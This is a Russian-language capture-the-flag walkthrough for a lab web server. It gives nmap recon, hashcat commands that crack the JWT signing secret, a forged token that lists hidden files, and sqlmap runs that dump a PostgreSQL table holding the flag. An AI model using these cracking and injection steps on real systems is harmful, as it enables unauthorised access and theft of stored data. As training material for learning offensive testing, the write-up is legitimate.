---
attack: jwt
---

Hint для тех у кого впн и сама страница на разных машинках 
#### 1 hint 
Изучение механизма JWT и его уязвимостей:  
  
Получите тестовый JWT и внимательно изучите его содержимое  
  
Изучите алгоритм генерации JWT и проверьте, есть ли возможность подобрать секретный ключ для генерации новых JWT

#### 2 hint 
Генерация и использование собственного JWT:  
Сгенерируйте новый JWT с использованием найденного секретного ключа. Обратите внимание на поле secret.  
  
Найдите скрытый PHP-файл при помощи check.php

#### 3 hint 
Эксплуатация SQL инъекции и выполнение кода:  
  
После нахождения supersecretadminloginyoullneverguess.php попробуйте подобрать данные для входа.  
Проверьте поле поиска информации о пользователях на предмет инъекций.  
Получите доступ к веб-серверу через уязвимость в базе данных PostgreSQL.


#### Разведка nmap

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:85:4a:9f:e9:70:ed:e7:80:ca:0d:3a:f4:6b:8d:ff (RSA)
|   256 fa:68:91:c4:1f:dc:be:f2:5d:22:ba:be:25:90:c2:bb (ECDSA)
|_  256 2a:16:b9:fd:68:2a:48:c2:b6:2b:34:d3:5d:1c:89:1c (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Test auth Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
1720/tcp open  h323q931?
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-02-08T11:04:29
|_Not valid after:  2031-02-06T11:04:29
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2120
|_    RProcessStartupPacket
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5432-TCP:V=7.94SVN%I=7%D=8/24%Time=66C9E886%P=x86_64-pc-linux-gnu%r
SF:(SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fron
SF:tend\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x
SF:203\.0\0Fpostmaster\.c\0L2120\0RProcessStartupPacket\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
тут кроме базы данных ничего не видим 
#### подготовка атаки

При заходи на сайт  видим след картину 
![[Pasted image 20240911180044.png]]
Запрос `GET /token.php?Get+Test+token=Submit+Query`
![[Pasted image 20240911180100.png]]
Token : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSmFtZXMiLCJkaXIiOiJzYW1wbGVzIiwia2V5IjoicXdlcnR5IiwidGltZXN0YW1wIjoxNzI0NTA3NTgwfQ.FGGagK9YlY2EHX52Sf_leBZ1HsneN9NREYcOGXZY2iw

Далее предлагаю вам ознакомиться с вот этим сайтом  https://jwt.io/
или  https://edgecenter.ru/dev-tools/decode-jwt
используем и видим 
![[Pasted image 20240911134137.png]]
Изучив Рисунок 1 видим HS256 уже знаем что это слабый алгоритм шифрования 
идём дальше 

 Как мы знаем один из стандартных способ узнать что то  на сайт это перебор каталогов , в данном случ он  нам даёт страничку  http://10.124.1.239/check.php 
ответ следующий
`Get param 'jwt' is not set`
это намёк на это что его нужно указать... 

Указываем его через ?jwt= , результат это список файлов
![[Pasted image 20240911181249.png]]

Думаю от нас что то хотя сделать с Jwt и отправить его сюда , как вы помните одна из payloads это параметр dir  который мы будем менять 

#### перебор Jwt

Способ 1 
Внимание на размер, качаем и   
https://www.weakpass.com/wordlist/1802

нужно подождать ... разархивации след командой  
gunzip HashesOrg.gz 

начинаем атаку(учитывайте расположение файлов ) {jwt.txt указать Jwt в файле без изменений }
 hashcat -a 0 -m 16500 jwt.txt ~/Downloads/HashesOrg 

![[Pasted image 20240911132254.png]]
Итог: 2e025

2 способ взлома 

hashcat -a 3 -m 16500 /home/kali/Desktop/Document/ffuz_txt/jwt.txt ?a?a?a?a?a?a?a -i --increment-min=4

(**?a?a?a?a?a?a?a** : Это маска, которая указывает, что Hashcat будет перебирать все возможные символы (буквы, цифры и специальные символы) для семи позиций. Символ `?a` обозначает любой символ из набора ASCII.)

#### charge token
Наш токен 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSmFtZXMiLCJkaXIiOiJzYW1wbGVzIiwia2V5IjoicXdlcnR5IiwidGltZXN0YW1wIjoxNzI2MDQxMTEzfQ.8HexxHT5cLuhRVaUpCu7N-YML0zfHkUkCWrcYMs-MPM

Далее имя ключ мы можем поменять данные в нашем токене 
Меняем
либо полный путь как на скине /var/www/html
или указать ./ 
Обе команды покажут нам директории сайта где находиться файла
![[Pasted image 20240911134012.png]]

Далее нужно указать наш новый токен 

Способ1 указать ?jwt= в бюрпе
![[Pasted image 20240911134035.png]]

2 способ указать ?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSmFtZXMiLCJkaXIiOiJzYW1wbGVzIiwia2V5IjoicXdlcnR5IiwidGltZXN0YW1wIjoxNzI2MDQxMTEzfQ.8HexxHT5cLuhRVaUpCu7N-YML0zfHkUkCWrcYMs-MPM
![[Pasted image 20240911175031.png]]
Видим крутую директорию Супеб бупер скрытая директория 

Переходим на данную ссылку и видим поля ввода пароля и логина ,(я кста сначала что тут sql ... но тут нету_(╯︿╰) 
Вводим ручками  admin admin и переходим на следующую  страницу где видим новые поля 

![[Pasted image 20240911182742.png]]

#### атака sql

я выполнял через sqlmap вы могли это сделать это по другому, думаю объяснять не нужно, просто используем команды 

Закидываем в файла pack http пакет из бюрпа  и выполняем закомментированною команду 
так как мы указываем куки в пакете , то поэтому не нужно указывать логин и пароль , что вводили до этого , если делаете по другому то нужно будет указать их скорее всего*
```
┌──(kali㉿kali)-[~/htb]
└─$ #sqlmap -r pack --level=5 --risk=3 --dbs --batch --random-agent --threads=10 --time-sec=5 --timeout=30 --ignore-code=404
cat pack 
POST /supersecretadminloginyoullneverguess.php HTTP/1.1
Host: tokenizer.edu.stf
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://tokenizer.edu.stf
DNT: 1
Connection: keep-alive
Cookie: _gcl_au=1.1.807887967.1724594292; _ga_E9PS2EVWYS=GS1.1.1724665941.2.1.1724676481.60.0.0; _ga=GA1.1.26186061.1724594292; _clck=1nao1d7%7C2%7Cfon%7C0%7C1698; _fbp=fb.1.1724594293979.186148304756426122; PHPSESSID=p80oov368a5mo6497j22dqhbuo
Upgrade-Insecure-Requests: 1

name=1&address=1&phone=1&email=1&plan=1&submit_search=Submit

available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

```

Атака2 смотрим таблички 

```
sqlmap -r pack --level=5 --risk=3 --tables -D public --batch --random-agent

+--------------+
| clients_data |
| secret       |
+--------------+

```

ищем колонку флаг 

```
sqlmap -r pack --level=5 --risk=3 --columns -D public -T clients_data --batch --random-agent

+---------+---------+
| Column  | Type    |
+---------+---------+
| name    | varchar |
| address | text    |
| email   | varchar |
| id      | int4    |
| phone   | varchar |
| plan    | varchar |
+---------+---------+

sqlmap -r pack --level=5 --risk=3 --columns -D public -T secret --batch --random-agent

+--------+--------+
| Column | Type   |
+--------+--------+
| flag   | bpchar |
| id     | int4   |
+--------+--------+

```
Находим и смотрим 
```
sqlmap -r pack --level=5 --risk=3 --dump -D public -T secret --batch --random-agent


+----+--------------------------------------+
| id | flag                                 |
+----+--------------------------------------+
| 1  | 32они_запрещают_делиться_флагамe58bd |
+----+--------------------------------------+


```
